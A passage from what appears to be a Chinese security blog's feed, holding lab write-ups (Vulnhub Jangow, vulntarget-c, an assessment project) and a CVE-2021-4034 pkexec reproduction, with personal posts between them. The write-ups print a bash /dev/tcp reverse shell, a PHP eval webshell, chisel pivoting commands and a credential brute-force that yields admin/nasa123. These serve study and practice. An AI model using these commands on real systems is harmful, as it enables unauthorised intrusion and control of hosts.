alt="image-20220323115012454"></p><p>攻击成功，这个时候我们去包含&#x2F;tmp&#x2F;g这个文件即可造成RCE</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220323115301656.png" alt="image-20220323115301656"></p><p>蚁剑连接</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220323124351938.png" alt="image-20220323124351938"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub - jangow WriteUp</title>
      <link href="/posts/3787765405/"/>
      <url>/posts/3787765405/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><p>Machines Name：Vulnhub - JANGOW: 1.0.1</p><p>Difficulty：easy  </p><p>Download：<a href="https://www.vulnhub.com/entry/the-planets-earth,755/">https://www.vulnhub.com/entry/the-planets-earth,755/</a></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -A  -vv -Pn 192.168.56.118</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE  SERVICE REASON          VERSION</span><br><span class="line">21/tcp open   ftp     syn-ack ttl 128 vsftpd 3.0.3</span><br><span class="line">53/tcp closed domain  reset ttl 128</span><br><span class="line">80/tcp open   http    syn-ack ttl 128 Apache httpd 2.4.18</span><br></pre></td></tr></table></figure><p>访问80端口是一个apache的目录，点击site目录跳转网站</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220301144133097.png" alt="image-20220301144133097"></p><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220301144212666.png" alt="image-20220301144212666"></p><p>目录扫描发现是wordpress的站点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.56.118/site/</span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220301144427391.png" alt="image-20220301144427391"></p><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220301144620032.png" alt="image-20220301144620032"></p><p>没什么很惊喜的东西，对网站本身功能进行一些测试，网站很简单，一个About页面、一个Projects页面、还有一个不清楚是什么功能的Buscar页面，Buscar这个点非常奇怪，可能突破口就在这。</p><p>![image-20220301144830618](&#x2F;Users&#x2F;lin&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20220301144830618.png)</p><p>前两个都能正常跳转页面，当点击Buscar的时候，会出现空白页面，并且出现了一个Get请求参数，推测需要做一个传参，可能是任意文件读取&#x2F;包含？也可能是任意代码执行？</p><p>读一下&#x2F;etc&#x2F;passwd没反应</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220301144830618.png" alt="image-20220301145116809"></p><p>尝试执行命令whoami有回显，确认此处可以执行任意系统命令，那不就简单了？直接反弹shell就行</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220301145233522.png" alt="image-20220301145233522"></p><p>在此之前先读一下user flag</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220301145339541.png" alt="image-20220301145339541"></p><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>反弹了一波shell，发现弹不回来，应该目标机器做了防火墙策略之类的限制,只能在站内执行命令。</p><p>想起来刚开始目录扫描到的wordpress的config.php文件，读取发现了账户和密码信息。</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220301151923355.png" alt="image-20220301151923355"></p><p>查看一下&#x2F;etc&#x2F;passwd看看有没有什么用户可以利用的，会不会有密码复用的一个问题</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220301152047714.png" alt="image-20220301152047714"></p><p>发现一个jangow01的普通用户，尝试使用密码abygurl69登录…没开22端口。。。。</p><p>向网站目录写webshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &lt;?php eval($_POST[&quot;pass&quot;]); &gt; 1.php</span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220301153939730.png" alt="image-20220301153939730"></p><p>成功上马</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220301154053993.png" alt="image-20220301154053993"></p><p>这个机器有点拉胯，shell一直弹不出来，是我手法有点问题，到此为止吧。。。。。。后面直接使用pkexec提权即可。</p>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub Machines </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulntarget - c 靶场 WriteUp</title>
      <link href="/posts/3260537659/"/>
      <url>/posts/3260537659/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><blockquote><p>此靶场来自于星期五实验室 微信号: Friday_LAB</p></blockquote><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -A -sV -v -Pn 192.168.189.151</span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-02-24_12-06-28.png" alt="Xnip2022-02-24_12-06-28"></p><p>80端口是个Laravel</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-02-24_12-07-47.png" alt="Xnip2022-02-24_12-07-47"></p><p>google搜寻公开可利用的<a href="https://github.com/zhzyker/CVE-2021-3129">exp</a> Laravel &lt;&#x3D; v8.4.2 debug mode: Remote code execution (CVE-2021-3129)</p><h2 id="Laravel-getshell"><a href="#Laravel-getshell" class="headerlink" title="Laravel getshell"></a>Laravel getshell</h2><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-02-24_12-46-49.png" alt="Xnip2022-02-24_12-46-49"></p><p>反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;exec bash -i &amp;&gt;/dev/tcp/192.168.189.133/9999 &lt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure><p>修改exp</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-02-25_11-43-03.png" alt="Xnip2022-02-25_11-43-03"></p><p>攻击机监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwncat-cs :9999</span><br></pre></td></tr></table></figure><p>执行exp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.py http://192.168.189.151/</span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-02-25_11-15-12.png" alt="Xnip2022-02-25_11-15-12"></p><p>获得目标www-data权限会话</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-02-25_11-49-34.png" alt="Xnip2022-02-25_11-49-34"></p><p>pkexec提权即可</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-02-25_11-53-33.png" alt="Xnip2022-02-25_11-53-33"></p><h3 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route <span class="comment">#查看路由表</span></span><br></pre></td></tr></table></figure><p>发现192.168.112.0&#x2F;24的内网段</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-02-25_11-56-04.png" alt="Xnip2022-02-25_11-56-04"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-02-25_11-58-21.png" alt="Xnip2022-02-25_11-58-21"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"># /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:106::/nonexistent:/usr/sbin/nologin</span><br><span class="line">syslog:x:104:110::/home/syslog:/usr/sbin/nologin</span><br><span class="line">_apt:x:105:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false</span><br><span class="line">uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin</span><br><span class="line">landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin</span><br><span class="line">pollinate:x:110:1::/var/cache/pollinate:/bin/false</span><br><span class="line">usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span><br><span class="line">sshd:x:112:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">vulntarget:x:1000:1000:vulntarget:/home/vulntarget:/bin/bash</span><br><span class="line">lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false</span><br></pre></td></tr></table></figure><h3 id="chisel-内网穿透"><a href="#chisel-内网穿透" class="headerlink" title="chisel 内网穿透"></a>chisel 内网穿透</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel server -p 8888 --reverse &amp; <span class="comment">#攻击机监听</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel client 192.168.189.133:8888 R:socks  &amp;<span class="comment">#目标机执行</span></span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-02-28_13-17-51.png" alt="Xnip2022-02-28_13-17-51"></p><p>配置proxychains</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5 127.0.0.1 1080</span><br></pre></td></tr></table></figure><p>fscan扫一下192.168.112.0&#x2F;24这个网段，没扫到，估计是windows开了防火墙的原因，使用msf扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan -h 192.168.112.0/24 -o ok.txt</span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-02-28_15-35-08.png" alt="Xnip2022-02-28_15-35-08"></p><p>192.168.112.131开了80</p><h2 id="一点意外"><a href="#一点意外" class="headerlink" title="一点意外"></a>一点意外</h2><p>代理成功，但是网页显示有点问题，我在本机以及虚拟机内的浏览器都无法正常显示和跳转</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-02-28_14-19-58.png" alt="Xnip2022-02-28_14-19-58"></p><p>这个问题暂时解决不了，也没时间解决，就先跳过这部分，关于这部分攻击过程可以看公众号的内容，后面也没啥东西了，懒得打了，我把最后一台linux打一下</p><p>登录上3389发现有MobaXterm,上面有一台linux</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-02-28_14-25-29.png" alt="Xnip2022-02-28_14-25-29"></p><p>直接使用pkexec提权至root即可</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-02-28_14-27-56.png" alt="Xnip2022-02-28_14-27-56"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个人的喜欢</title>
      <link href="/posts/2446613835/"/>
      <url>/posts/2446613835/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="50d2a0f31dbafaf51bab2692bb5c89dec6848007e40f965dd3dd8df363420287"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一点点小心思</title>
      <link href="/posts/1130970641/"/>
      <url>/posts/1130970641/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>我属于那种典型的理工男，从小语文就不好，有一天突然萌发了要做一个自己博客的念头，于是就开始动手，刚开始是用wordpress搭建的，那个时候啥都不懂，还经常被自己专业的同学进行压力测试，后来学习事情也多，也慢慢夭折了，真正下定决心是大三那一段时间，人越成长越感觉时间把握不住，由于不经常联系的缘故，曾经的好朋友也逐渐疏远变淡，也不好意思去找人家，毕竟大家都有事情，只是说偶尔路上遇见了打个招呼，老朋友！于是我喜欢把这些事情记录下来，比起分享给他人，我更乐意留给以后的自己看，这也是个人的沉淀，能从中锻炼自己的写作，重要的是能在工作中更好的输出报告哈哈哈哈，不得不说，写博客确实让我这个从小语文功底就差的人多了点文艺气息哈哈哈哈哈哈哈。</p><p>本博客采用hexo+github page，就是个静态页面，希望各位大佬手下留情，也没有必要。鞠躬！</p><p><img src="https://img0.baidu.com/it/u=192343243,2819369239&fm=253&fmt=auto&app=138&f=JPG?w=419&h=414"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-4034 Linux Polkit权限提升漏洞复现</title>
      <link href="/posts/1069891110/"/>
      <url>/posts/1069891110/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h2 id="关于Polkit"><a href="#关于Polkit" class="headerlink" title="关于Polkit"></a>关于Polkit</h2><p>Polkit是一个应用程序级别的工具集，通过定义和审核权限规则，实现不同优先级进程间的通讯：控制决策集中在统一的框架之中，决定低优先级进程是否有权访问高优先级进程。 pkexec是一个Linux下Polkit里的setuid工具，允许授权用户在预定的策略下以其他用户身份执行命令。</p><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pkexec --version |</span><br><span class="line">       --<span class="built_in">help</span> |</span><br><span class="line">       --disable-internal-agent |</span><br><span class="line">       [--user username] PROGRAM [ARGUMENTS...]</span><br></pre></td></tr></table></figure><h2 id="PwnKit-漏洞的潜在影响"><a href="#PwnKit-漏洞的潜在影响" class="headerlink" title="PwnKit 漏洞的潜在影响"></a>PwnKit 漏洞的潜在影响</h2><p>polkit的pkexec实用程序中存在一个本地权限提升漏洞。当前版本的pkexec无法正确处理调用参数计数，并最终尝试将环境变量作为命令执行。攻击者可以通过控制环境变量来利用这一点，从而诱导pkexec执行任意代码。利用成功后，会导致本地特权升级，非特权用户获得管理员权限。</p><p>成功利用此漏洞允许任何非特权用户在易受攻击的主机上获得 root 特权。Qualys 安全研究人员已经能够独立验证漏洞，开发漏洞利用，并在默认安装的 Ubuntu、Debian、Fedora 和 CentOS 上获得完整的 root 权限。其他 Linux 发行版可能容易受到攻击并且可能被利用。这个漏洞已经隐藏了 12 年多，并影响自 2009 年 5 月第一个版本以来的所有 pkexec 版本（commit c8c3d83，“Add a pkexec(1) command”）。</p><h2 id="安全版本"><a href="#安全版本" class="headerlink" title="安全版本"></a>安全版本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">CentOS系列：</span><br><span class="line">CentOS 6：polkit-0.96-11.el6_10.2</span><br><span class="line">CentOS 7：polkit-0.112-26.el7_9.1</span><br><span class="line">CentOS 8.0：polkit-0.115-13.el8_5.1</span><br><span class="line">CentOS 8.2：polkit-0.115-11.el8_2.2</span><br><span class="line">CentOS 8.4：polkit-0.115-11.el8_4.2</span><br><span class="line"></span><br><span class="line">Ubuntu系列：</span><br><span class="line">Ubuntu 20.04 LTS：policykit-1 - 0.105-26ubuntu1.2</span><br><span class="line">Ubuntu 18.04 LTS：policykit-1 - 0.105-20ubuntu0.18.04.6</span><br><span class="line">Ubuntu 16.04 ESM：policykit-1 - 0.105-14.1ubuntu0.5+esm1</span><br><span class="line">Ubuntu 14.04 ESM：policykit-1 - 0.105-4ubuntu3.14.04.6+esm1</span><br></pre></td></tr></table></figure><h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>使用docker环境复现</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull ubuntu:16.04 <span class="comment">#拉取一个ubuntu的基础镜像</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name CVE-2021-4034 -itd 镜像<span class="built_in">id</span>  <span class="comment">#使用ubuntu基础镜像构建一个容器 </span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it /bin/bash 容器<span class="built_in">id</span> <span class="comment">#进入容器命令行环境</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt update &amp;&amp; apt install policykit-1 <span class="comment">#安装Polkit</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt update &amp;&amp; apt install build-essential <span class="comment">#安装一些常用环境以及相关依赖 比如gcc</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd -m <span class="built_in">test</span> <span class="comment">#添加一个普通用户</span></span><br></pre></td></tr></table></figure><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p><img src="https://typro-1304950244.file.myqcloud.com/img/Kapture%202022-03-08%20at%2014.33.26.gif"></p><h2 id="相关exp"><a href="#相关exp" class="headerlink" title="相关exp"></a>相关exp</h2><p><a href="https://github.com/berdav/CVE-2021-4034">https://github.com/berdav/CVE-2021-4034</a></p><p><a href="https://github.com/dzonerzy/poc-cve-2021-4034">https://github.com/dzonerzy/poc-cve-2021-4034</a></p><p><a href="https://github.com/joeammond/CVE-2021-4034">https://github.com/joeammond/CVE-2021-4034</a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/10870">https://xz.aliyun.com/t/10870</a></p><p><a href="https://sentrylab.cn/about/polkit-CVE-2021-4034/">https://sentrylab.cn/about/polkit-CVE-2021-4034/</a></p><p><a href="https://juejin.cn/post/7067894315351179271">https://juejin.cn/post/7067894315351179271</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>暗月2022年一月考核项目 - NASA WriteUp</title>
      <link href="/posts/14925407/"/>
      <url>/posts/14925407/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><blockquote><p>暗月师傅 2022年一月考核项目 NASA WriteUp</p></blockquote><h1 id="一、外网打点"><a href="#一、外网打点" class="headerlink" title="一、外网打点"></a>一、外网打点</h1><p>常规套路走一下,nmap端口扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -A -v -Pn 103.xxx.xxx.19</span><br></pre></td></tr></table></figure><p>看这个扫描结果应该是做的映射</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE  SERVICE    VERSION</span><br><span class="line">53/tcp   closed domain</span><br><span class="line">80/tcp   open   tcpwrapped</span><br><span class="line">| http-methods:</span><br><span class="line">|<span class="built_in">_</span>  Supported Methods: OPTIONS</span><br><span class="line">3389/tcp open   tcpwrapped</span><br><span class="line">| ssl-cert: Subject: commonName=SBrYse1001582</span><br><span class="line">| Issuer: commonName=SBrYse1001582</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2022-01-07T02:49:32</span><br><span class="line">| Not valid after:  2022-07-09T02:49:32</span><br><span class="line">| MD5:   22ec 40a4 08f4 efed da17 9af8 d840 42a7</span><br><span class="line">|<span class="built_in">_</span>SHA-1: fb30 c000 ffa9 2c80 3786 afe8 e0f8 6f76 086d 8413</span><br></pre></td></tr></table></figure><p>dirsearch目录扫描，看看会不会有网站后台惊喜</p><p>直接扫会提示连接失败，应该是线路原因，月师傅这台机器肯定是xxxx哈哈哈哈哈哈哈</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-15_13-58-23.png"></p><p>加个代理扫描目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxy dirsearch -u http://103.xxx.xxx.19/</span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-15_13-57-23.png"></p><p>Get 后台地址</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-15_17-10-05.png"></p><blockquote><p>后台地址：<a href="http://103.xxx.xxx.19/admin/webadmin.php?mod=do&amp;act=login">http://103.xxx.xxx.19/admin/webadmin.php?mod=do&amp;act=login</a></p></blockquote><p>测试登录处验证码可复用</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-15_17-14-30.png"></p><h2 id="后台验证码复用-amp-管理员弱口令"><a href="#后台验证码复用-amp-管理员弱口令" class="headerlink" title="后台验证码复用&amp;管理员弱口令"></a>后台验证码复用&amp;管理员弱口令</h2><p>一波弱口令无果，生成定向社工字典试试</p><p>社工字典在线生成<a href="https://www.ddosi.org/pass8/">https://www.ddosi.org/pass8/</a></p><p>moon就是暗月、moonsec是暗月安全（公众号）、nasa是本次项目名称</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-15_17-30-56.png"></p><p>burp爆破</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-15_17-28-04.png"></p><p>wtmfuck？ 项目名+123就是密码</p><p>成功登录后台</p><blockquote><p>后台地址：<a href="http://103.xxx.xxx.19/admin/webadmin.php?mod=do&amp;act=login">http://103.xxx.xxx.19/admin/webadmin.php?mod=do&amp;act=login</a>   admin&#x2F;nasa123</p></blockquote><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-15_17-38-17.png"></p><p>针对后台的功能点进行测试</p><p>找到几处文件上传，但是应该是传不了的（是我菜吧）</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-15_17-46-15.png"></p><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-15_17-45-38.png"></p><p>其它好像也没什么东西，根据后台页面标题可以知道这个系统叫逍遥商城系统，那么可以看看网上是不是有源代码，有的话可以审计一波</p><p>运气很好，看到一篇别人对此系统的审计文章：<a href="https://www.jianshu.com/p/d5a180ebeb7e">https://www.jianshu.com/p/d5a180ebeb7e</a></p><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-15_17-46-15.png"></p><p>根据这篇审计文章可以得知这套系统可能有两个漏洞</p><p>1、后台任意文件删除</p><p>2、后台盲注</p><p>别问我为什么不自己审一下（我感觉我审不出来哈哈哈哈哈）</p><p>并且作者很贴心的给出了目录结构</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">├── admin ---后台管理目录</span><br><span class="line">├── api.php ---api入口文件</span><br><span class="line">├── attachment ---图片等文件存放目录</span><br><span class="line">├── cache ---缓存文件目录</span><br><span class="line">├── common.php</span><br><span class="line">├── config.php ---配置文件</span><br><span class="line">├── data ---备份文件等目录</span><br><span class="line">├── hook ---hook文件</span><br><span class="line">├── httpd.ini</span><br><span class="line">├── 